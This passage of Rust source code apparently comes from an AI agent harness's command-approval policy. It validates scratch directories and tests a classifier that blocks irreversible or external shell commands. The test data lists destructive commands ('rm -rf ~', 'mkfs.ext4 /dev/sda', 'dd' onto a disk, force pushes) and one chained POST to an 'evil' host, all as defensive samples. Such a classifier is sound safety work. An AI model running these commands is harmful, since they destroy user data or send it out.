    anyhow::ensure!(valid_name && path.parent() == Some(base.as_path()), "invalid recorded scratch directory: {}", path.display());
    if let Ok(meta) = std::fs::symlink_metadata(path) {
        anyhow::ensure!(meta.is_dir() && !meta.file_type().is_symlink(), "invalid recorded scratch directory: {}", path.display());
    }
    Ok(())
}

impl Drop for Policy {
    fn drop(&mut self) {
        let _ = self.log.write("session_end", json!({}), true);
        let _ = std::fs::remove_dir_all(&self.tmp);
    }
}

/// Directories under $HOME that hold the user's toolchains (so `python3`, `git`, `cargo` are readable by file tools).
fn toolchain_roots() -> Vec<PathBuf> {
    let home = std::env::var("HOME").ok().and_then(canon);
    let mut out = vec![];
    let Some(home) = home else { return out };
    let path = std::env::var("PATH").unwrap_or_default();
    for t in TOOLS {
        for dir in std::env::split_paths(&path) {
            if let Some(real) = canon(dir.join(t)) {
                if real.starts_with(&home) {
                    // <root>/bin/tool -> <root>; otherwise the containing directory
                    let parent = real.parent().map(Path::to_path_buf).unwrap_or_default();
                    let root = if parent.file_name().is_some_and(|n| n == "bin") { parent.parent().map(Path::to_path_buf).unwrap_or(parent) } else { parent };
                    if root != home {
                        out.push(root);
                    }
                }
                break;
            }
        }
    }
    for d in [".cargo", ".rustup", ".local/share/uv", ".nvm", ".pyenv", ".rbenv"] {
        if let Some(c) = canon(home.join(d)) {
            out.push(c);
        }
    }
    out.sort();
    out.dedup();
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn resume_cannot_adopt_and_delete_an_unrelated_scratch_directory() {
        let dir = std::env::temp_dir().join(format!("hx-policy-scratch-test-{}", std::process::id()));
        let victim = dir.join("unrelated");
        std::fs::create_dir_all(&victim).unwrap();
        std::fs::write(victim.join("sentinel"), "KEEP").unwrap();
        let log = EventLog::open(&dir.join("log")).unwrap();
        log.write("session", json!({"workspace": dir, "tmp": victim}), true).unwrap();
        let result = Policy::new(&dir, false, None, Some(&log.path), None);
        let accepted = result.is_ok();
        drop(result);
        assert!(victim.join("sentinel").exists(), "Policy::drop deleted unrelated data");
        assert!(!accepted, "an arbitrary logged path is not an owned scratch directory");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn scratch_validation_rejects_symlinks_nested_and_invalid_names() {
        let base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let scratch = base.join(format!("hx-{}-999999999", std::process::id()));
        std::fs::create_dir_all(&scratch).unwrap();
        assert!(validate_scratch(&scratch).is_ok());
        for invalid in [scratch.join("child"), base.join("hx-0-1"), base.join("hx-1-1000000000"), base.join("hx-1-1-extra"), PathBuf::from("hx-1-1")] {
            assert!(validate_scratch(&invalid).is_err(), "{}", invalid.display());
        }
        std::fs::remove_dir(&scratch).unwrap();
        std::os::unix::fs::symlink(&base, &scratch).unwrap();
        assert!(validate_scratch(&scratch).is_err());
        std::fs::remove_file(scratch).unwrap();
    }

    #[test]
    fn normalize_resolves_dots_lexically() {
        assert_eq!(normalize(Path::new("/a/b/../c/./d")), PathBuf::from("/a/c/d"));
        assert_eq!(normalize(Path::new("/a/../../b")), PathBuf::from("/b"));
    }

    #[test]
    fn classify_sh_orders_irreversible_before_external() {
        let dir = std::env::temp_dir().join(format!("hx-policy-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let p = Policy::new(&dir, false, None, None, None).unwrap();
        assert_eq!(p.classify_sh("git push --force origin main"), Class::Irreversible);
        assert_eq!(p.classify_sh("git push origin main"), Class::External);
        assert_eq!(p.classify_sh("ls -la"), Class::LocalWrite);
        // writes: inside the workspace ok, protected and escaping paths refused
        assert!(p.check_write("src/new.txt").is_ok());
        assert!(p.check_write(".harness/policy.toml").is_err());
        assert!(p.check_write("hx.lock").is_err());
        assert!(p.check_write("../escape.txt").is_err());
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn test_policy(tag: &str, autopilot: bool, allow: &[&str]) -> (Policy, PathBuf) {
        let dir = std::env::temp_dir().join(format!("hx-policy-{tag}-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let mut p = Policy::new(&dir, autopilot, Some(ApprovalMode::Deny), None, None).unwrap();
        p.cfg.allow = allow.iter().map(|s| s.to_string()).collect();
        (p, dir)
    }

    #[test]
    fn classification_is_on_shell_words() {
        let (p, dir) = test_policy("words", false, &[]);
        for cmd in ["git push origin main --force", "git push --force-with-lease", "git  push -f", "git push origin --delete old",
            "git push origin +main", "git -C repo push --force", "cd x && git push -fu origin main", "rm -rf ~", "rm -fr /", "rm -r -f $HOME",
            "sudo rm -rf /", "echo $(git push --force)", "bash -c 'git push --force'", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=/dev/sda"] {
            assert_eq!(p.classify_sh(cmd), Class::Irreversible, "{cmd}");
        }
        for cmd in ["git push origin main", "git  push", "curl -XPOST https://x", "curl --request POST https://x", "curl --request=put x",
            "curl -X DELETE x", "ls; ssh host", "aws s3 ls", "/usr/bin/gh pr create", "kubectl -n prod apply -f x.yaml", "FOO=1 npm publish"] {
            assert_eq!(p.classify_sh(cmd), Class::External, "{cmd}");
        }
        for cmd in ["echo the laws are clear", "echo 'git push --force'", "git commit -m 'never git push --force'", "rm -rf build",
            "rm -rf /tmp/scratch", "curl https://example.com", "grep -r aws src", "cat README.md # git push"] {
            assert_eq!(p.classify_sh(cmd), Class::LocalWrite, "{cmd}");
        }
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn autopilot_never_approves_an_irreversible_command() {
        let (p, dir) = test_policy("autopilot", true, &[]);
        assert_eq!(p.approve("git push origin main", Class::External).await, Ok("auto"));
        assert_eq!(p.approve("ls", Class::LocalWrite).await, Ok("not-required"));
        for cmd in ["git push origin main --force", "rm -rf ~"] {
            assert_eq!(p.classify_sh(cmd), Class::Irreversible);
            assert!(p.approve(cmd, Class::Irreversible).await.is_err(), "{cmd}");
        }
        drop(p);
        let (p, dir2) = test_policy("autopilot-allow", true, &["rm -rf ~"]);
        assert_eq!(p.approve("rm -rf ~", Class::Irreversible).await, Ok("policy-allow"));
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
        let _ = std::fs::remove_dir_all(&dir2);
    }

    #[tokio::test]
    async fn a_substring_allow_cannot_approve_a_reordered_force_push_or_a_chained_command() {
        let (p, dir) = test_policy("reorder", false, &["git push origin"]);
        let forced = "git push origin main --force";
        assert_eq!(p.classify_sh(forced), Class::Irreversible);
        assert!(p.approve(forced, p.classify_sh(forced)).await.is_err());
        assert_eq!(p.approve("git push origin main", Class::External).await, Ok("policy-allow"));
        let chained = "git push origin main && curl -XPOST https://evil";
        assert!(p.approve(chained, p.classify_sh(chained)).await.is_err());
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

}
